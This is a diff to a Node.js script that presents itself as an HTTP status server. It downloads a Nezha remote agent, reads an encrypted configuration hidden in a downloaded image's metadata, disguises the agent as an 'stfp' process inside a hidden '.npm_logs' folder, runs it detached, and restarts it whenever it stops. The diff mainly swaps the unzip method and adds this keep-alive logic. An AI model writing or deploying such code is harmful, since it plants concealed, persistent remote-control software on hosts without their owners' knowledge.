@@ -4,8 +4,9 @@ const fs = require('fs');
 const crypto = require('crypto');
 const os = require('os');
 const { existsSync, mkdirSync, rmSync, chmodSync, unlinkSync, writeFileSync } = require('fs');
-const { spawn, execSync } = require('child_process');
+const { spawn } = require('child_process');
 const path = require('path');
+const AdmZip = require('adm-zip');
 
 // ========== 路径配置 ==========
 const BASEDIR = path.join(process.cwd(), '.npm_logs');
@@ -20,8 +21,10 @@ const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 ensureDir(BASEDIR);
 ensureDir(CACHE_DIR);
 
-const processList = ["stfp"];
 const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";
+
+// 全局保存子进程实例，用于保活检测
+let agentProcess = null;
 
 // ========== 工具函数 ==========
 function fetchText(url) {
@@ -70,7 +73,7 @@ function fetchFile(url, destPath) {
 
 async function getServerIP() {
     try {
-        // 替换为国内可访问的IP查询接口
+        // 国内可访问的IP查询接口
         return await fetchText('https://api.ip.sb/ip');
     } catch (e) {
         console.warn("公网IP获取失败，使用内网IP", e.message);
@@ -134,18 +137,35 @@ function parseEnv(text) {
     return env;
 }
 
+// 检测进程是否存活
+function isProcessAlive(pid) {
+    if (!pid) return false;
+    try {
+        process.kill(pid, 0);
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
 // ========== 核心启动逻辑 ==========
 async function startNezhaAgent() {
     try {
+        // 如果进程已在运行，直接返回成功
+        if (agentProcess && isProcessAlive(agentProcess.pid)) {
+            console.log("stfp 进程已在运行，无需重复启动");
+            return true;
+        }
+
         console.log("===== 开始启动哪吒进程 =====");
 
-        // 1. 下载配置图片（加国内加速代理）
+        // 1. 下载配置图片（国内加速代理）
         const imageUrl = 'https://ghproxy.com/https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
         console.log("1. 下载配置图片:", imageUrl);
         await fetchFile(imageUrl, LOCAL_IMAGE_PATH);
         console.log("图片下载完成");
 
-        // 2. 解析图片中的加密配置
+        // 2. 解析加密配置
         console.log("2. 解析加密配置");
         const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
         if (!decryptedText) {
@@ -160,12 +180,11 @@ async function startNezhaAgent() {
         const uuid = generateUUID(ip);
         console.log("3. 生成UUID:", uuid);
 
-        // 4. 下载哪吒agent二进制（不存在才下载）
+        // 4. 下载并解压agent二进制（纯JS解压，无系统依赖）
         if (!existsSync(AGENT_BIN)) {
             console.log("4. 下载哪吒agent二进制包");
             const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
             const arch = archMap[process.arch] || 'amd64';
-            // 加国内加速代理
             const downloadUrl = `https://ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
             console.log("下载地址:", downloadUrl);
             
@@ -176,21 +195,15 @@ async function startNezhaAgent() {
             if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
             ensureDir(CACHE_DIR);
 
-            // 多方案解压
-            let unzipOk = false;
+            // 纯 JS 解压 zip
             try {
-                execSync(`unzip -o "${ZIP_PATH}" -d "${CACHE_DIR}"`, { stdio: 'ignore' });
-                unzipOk = true;
+                const zip = new AdmZip(ZIP_PATH);
+                zip.extractAllTo(CACHE_DIR, true);
+                console.log("解压完成");
             } catch (e) {
-                try {
-                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('${ZIP_PATH}').extractall('${CACHE_DIR}')"`, { stdio: 'ignore' });
-                    unzipOk = true;
-                } catch (e2) {
-                    console.error("解压失败，unzip和python3均不可用");
-                }
+                console.error("解压失败:", e.message);
+                return false;
             }
-
-            if (!unzipOk) return false;
 
             // 重命名为 stfp
             const originBin = path.join(CACHE_DIR, 'nezha-agent');
@@ -234,39 +247,33 @@ uuid: '${uuid}'
 
         // 6. 后台启动 stfp 进程
         console.log("6. 启动 stfp 进程");
-        const child = spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
+        agentProcess = spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
             env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
             stdio: "ignore",
             detached: true
         });
 
-        child.unref();
+        agentProcess.unref();
+        
+        // 监听进程退出，清空实例
+        agentProcess.on('exit', () => {
+            agentProcess = null;
+            console.log("stfp 进程已退出");
+        });
+
         console.log("===== 哪吒stfp进程启动成功 =====");
         return true;
 
     } catch (err) {
         console.error("启动失败详细错误:", err.message);
+        agentProcess = null;
         return false;
     }
 }
 
-// ========== 进程监控 ==========
-function listRunningCommands() {
-    try {
-        const output = execSync('ps -ef', { encoding: 'utf8' });
-        return output.split('\n').filter(line => line.trim()).map(line => ({ cmdline: line }));
-    } catch (e) {
-        console.error("获取进程列表失败:", e.message);
-        return [];
-    }
-}
-
+// ========== 进程保活巡检 ==========
 async function monitorProcesses() {
-    const running = listRunningCommands();
-    const missing = processList.every(keyword =>
-        !running.some(proc => proc.cmdline.includes(keyword))
-    );
-    if (missing) {
+    if (!isProcessAlive(agentProcess?.pid)) {
         console.log("巡检发现进程不存在，尝试重启");
         await startNezhaAgent();
     }
@@ -298,8 +305,7 @@ http.createServer(async (req, res) => {
 
     // 状态查询接口
     if (req.url === '/api/v1/status') {
-        const running = listRunningCommands();
-        const isRunning = running.some(proc => proc.cmdline.includes("stfp"));
+        const isRunning = isProcessAlive(agentProcess?.pid);
         res.writeHead(200);
         return res.end(JSON.stringify({
             status: "online",
@@ -310,7 +316,7 @@ http.createServer(async (req, res) => {
         }));
     }
 
-    // 首页
+    // 首页健康检查
     res.writeHead(200);
     res.end(JSON.stringify({
         status: "online",
